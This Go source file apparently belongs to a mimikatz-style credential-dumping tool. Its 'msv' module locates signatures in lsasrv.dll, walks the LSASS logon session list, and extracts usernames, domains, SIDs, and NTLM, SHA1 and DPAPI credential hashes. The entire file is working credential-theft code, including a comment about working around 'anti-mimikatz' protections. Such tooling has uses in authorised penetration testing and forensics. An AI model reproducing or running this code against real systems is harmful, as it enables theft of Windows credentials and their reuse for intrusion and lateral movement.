package msv

import (
	"encoding/hex"
	"fmt"
	"time"

	"github.com/vincd/savoir/modules/sekurlsa/packages/globals"
	"github.com/vincd/savoir/utils"
	"github.com/vincd/savoir/utils/binary"
	"github.com/vincd/savoir/windows"
	"github.com/vincd/savoir/windows/ntdll"
)

type MSVEntry struct {
	Primary                 string `json:"primary"`
	AuthenticationPackageId uint32 `json:"authentication_package_id"`
	EncCredentials          []byte `json:"-"`
	UserName                string `json:"username"`
	Domain                  string `json:"domain"`
	NTLMHash                string `json:"ntlm"`
	SHA1Hash                string `json:"sha1"`
	DPApi                   string `json:"dpapi"`
}

type LogonEntry struct {
	LocallyUniqueIdentifier uint64         `json:"luid"`
	UserName                string         `json:"username"`
	Domain                  string         `json:"domain"`
	LogonServer             string         `json:"logon_server"`
	LogonTime               time.Time      `json:"logon_time"`
	Sid                     string         `json:"sid"`
	Credentials             binary.Pointer `json:"-"`
	CredentialManager       binary.Pointer `json:"-"`
}

func ParseClearCredentials(l utils.MemoryReader, clearCredentials []byte) (*MSVEntry, error) {
	reference, err := globals.FindSignature(LogonEntrySignatures, l.ProcessorArchitecture(), l.BuildNumber())
	if err != nil {
		return nil, err
	}

	r := utils.NewBytesReader(clearCredentials, l.ProcessorArchitecture().Isx64())

	// Strange structure
	if clearCredentials[4] == 0xCC && clearCredentials[5] == 0xCC && clearCredentials[6] == 0xCC && clearCredentials[7] == 0xCC {
		credentials := &Msv10PrimaryCredentialStrange{}
		if err := r.ReadStructure(binary.Pointer(0), credentials); err != nil {
			return nil, fmt.Errorf("Error decoding Msv10PrimaryCredentialStrange struct %s.", err)
		}

		entry := &MSVEntry{
			UserName: "",
			Domain:   "",
			NTLMHash: hex.EncodeToString(credentials.NtOwfPassword[:]),
			SHA1Hash: hex.EncodeToString(credentials.ShaOwPassword[:]),
		}

		return entry, nil
	}

	domain, err := ntdll.GetLsaUnicodeStringValue(r, binary.Pointer(reference.Offsets[10]))
	if err != nil {
		return nil, err
	}

	username, err := ntdll.GetLsaUnicodeStringValue(r, binary.Pointer(reference.Offsets[11]))
	if err != nil {
		return nil, err
	}

	entry := &MSVEntry{
		UserName: username,
		Domain:   domain,
	}

	entry.NTLMHash = hex.EncodeToString(clearCredentials[reference.Offsets[12] : reference.Offsets[12]+16])
	entry.SHA1Hash = hex.EncodeToString(clearCredentials[reference.Offsets[14] : reference.Offsets[14]+20])

	if l.BuildNumber() >= windows.BuildNumberWindows10_1607 && l.ProcessorArchitecture() == windows.ProcessorArchitectureAMD64 {
		if clearCredentials[reference.Offsets[18]] == 1 {
			entry.DPApi = hex.EncodeToString(clearCredentials[reference.Offsets[17] : reference.Offsets[17]+16])
		}
	}

	return entry, nil
}

func ParseMSV(l utils.MemoryReader, credentialsPtr binary.Pointer) ([]MSVEntry, error) {
	entries := make([]MSVEntry, 0)

	ptr := credentialsPtr
	for ptr > 0 {
		credentials := &KiwiMsv10Credentials{}
		if err := l.ReadStructure(ptr, credentials); err != nil {
			return nil, err
		}

		primaryEntries, err := parsePrimaryCredentials(l, credentials.PrimaryCredentials, credentials.AuthenticationPackageId)
		if err != nil {
			return nil, err
		}

		entries = append(entries, primaryEntries...)

		ptr = credentials.Next
		if ptr == credentialsPtr {
			break
		}
	}

	return entries, nil
}

func parsePrimaryCredentials(l utils.MemoryReader, ptrPrimaryCredentials binary.Pointer, authenticationPackageId uint32) ([]MSVEntry, error) {
	entries := make([]MSVEntry, 0)

	ptr := ptrPrimaryCredentials
	for ptr > 0 {
		primaryCredentials := &KiwiMSV10PrimaryCredentials{}
		if err := l.ReadStructure(ptr, primaryCredentials); err != nil {
			return nil, err
		}

		primary, err := l.Read(primaryCredentials.Primary.BufferPointer, uint32(primaryCredentials.Primary.Length))
		if err != nil {
			return nil, err
		}

		entry := MSVEntry{
			Primary:                 string(primary),
			AuthenticationPackageId: authenticationPackageId,
			EncCredentials:          make([]byte, primaryCredentials.Credentials.Length),
		}

		if err := l.ReadStructure(primaryCredentials.Credentials.BufferPointer, entry.EncCredentials); err != nil {
			return nil, err
		}

		entries = append(entries, entry)

		ptr = primaryCredentials.Next
		if ptr == ptrPrimaryCredentials {
			break
		}
	}

	return entries, nil
}

func GetLogonEntryList(l utils.MemoryReader) ([]LogonEntry, error) {
	// Get LSA pattern from the build number
	reference, referenceIndex, err := globals.FindSignatureNew(LogonEntrySignatures, l.ProcessorArchitecture(), l.BuildNumber())
	if err != nil {
		return nil, err
	}

	patternOffset, err := globals.FindSignatureInModuleMemory(l, "lsasrv.dll", reference.Pattern)
	if err != nil {
		return nil, err
	}

	// TODO: on old device, default value is 1
	logonSessionListCount := byte(1)
	if l.ProcessorArchitecture().Isx64() && l.BuildNumber() >= windows.BuildNumberWindows2K3 {
		logonSessionListCountBytes, err := l.ReadFromPointer(patternOffset.WithOffset(reference.Offsets[1]), 1)
		if err != nil {
			return nil, err
		}

		logonSessionListCount = logonSessionListCountBytes[0]
	}

	_, firstListEntryPtr, err := l.ReadNextPointer(patternOffset.WithOffset(reference.Offsets[0]))
	if err != nil {
		return nil, err
	}

	// Check for anti-mimikatz
	// TODO: add TimeDateStamp check
	if l.BuildNumber() >= windows.BuildNumberWindows7 && l.BuildNumber() < windows.BuildNumberWindows8 && true {
		fmt.Printf("[!] We don't check the TimeDateStamp of the dll.")
		reference = &LogonEntrySignatures[referenceIndex+1]
	}

	logonEntryList := make([]LogonEntry, 0)
	for i := byte(0); i < logonSessionListCount; i++ {
		firstEntryPtr := firstListEntryPtr

		for j := byte(0); j < i*2; j++ {
			if l.ProcessorArchitecture().Isx64() {
				firstEntryPtr = firstEntryPtr.WithOffset(8)
			} else {
				firstEntryPtr = firstEntryPtr.WithOffset(4)
			}
		}

		currentEntryPtr := firstEntryPtr
		for currentEntryPtr > 0 {
			flink, err := l.ReadPointer(currentEntryPtr.WithOffset(reference.Offsets[2]))
			if err != nil {
				return nil, err
			}

			// When this unknow field is 0xFFFFFFFF then the structure is correct
			unk1, err := l.ReadUInt64(currentEntryPtr.WithOffset(reference.Offsets[16]))
			if err != nil {
				return nil, err
			}

			// Try to get the username to ensure the "unk1 theory" is right.
			// unk1   | err | Result
			// 0xF..F | nil | ok : this is the normal case
			// 0xF..F | obj | -- : Something went wrong while reading memory
			// 0xX..X | obj | ok : The theory is good
			// 0xX..X | nil | ko : Hum.. we should not be able to read a string (string != "")
			username, err := ntdll.GetLsaUnicodeStringValue(l, currentEntryPtr.WithOffset(reference.Offsets[3]))
			if err != nil {
				if unk1 == 0xffffffff {
					return nil, fmt.Errorf("Error getting username with unk1=%x: %s", unk1, err)
				}
			} else {
				if unk1 != 0xffffffff && len(username) > 0 {
					utils.DumpMemory(l, currentEntryPtr, uint32(reference.Offsets[3])+0x10)
					return nil, fmt.Errorf("We can read a username (%s) with unk1=%x.", username, unk1)
				}
			}

			if unk1 == 0xffffffff {
				domain, err := ntdll.GetLsaUnicodeStringValue(l, currentEntryPtr.WithOffset(reference.Offsets[4]))
				if err != nil {
					return nil, err
				}

				logonServer, err := ntdll.GetLsaUnicodeStringValue(l, currentEntryPtr.WithOffset(reference.Offsets[5]))
				if err != nil {
					return nil, err
				}

				pSid, err := l.ReadPointer(currentEntryPtr.WithOffset(reference.Offsets[6]))
				if err != nil {
					return nil, err
				}

				sid := &ntdll.Sid{}
				if err := sid.Decode(l, pSid); err != nil {
					return nil, err
				}

				luid, err := l.ReadUInt64(currentEntryPtr.WithOffset(reference.Offsets[7]))
				if err != nil {
					return nil, err
				}

				logonTime, err := l.ReadFileTime(currentEntryPtr.WithOffset(reference.Offsets[15]))
				if err != nil {
					return nil, err
				}

				pCredentials, err := l.ReadPointer(currentEntryPtr.WithOffset(reference.Offsets[8]))
				if err != nil {
					return nil, err
				}

				pCredentialManager, err := l.ReadPointer(currentEntryPtr.WithOffset(reference.Offsets[9]))
				if err != nil {
					return nil, err
				}

				logonEntryList = append(logonEntryList, LogonEntry{
					LocallyUniqueIdentifier: luid,
					UserName:                username,
					Domain:                  domain,
					LogonServer:             logonServer,
					LogonTime:               logonTime,
					Sid:                     sid.String(),
					Credentials:             pCredentials,
					CredentialManager:       pCredentialManager,
				})
			}

			// walk to the next entry
			currentEntryPtr = flink

			// stop when we walk through the list
			if currentEntryPtr == firstEntryPtr {
				break
			}
		}
	}

	return logonEntryList, nil
}
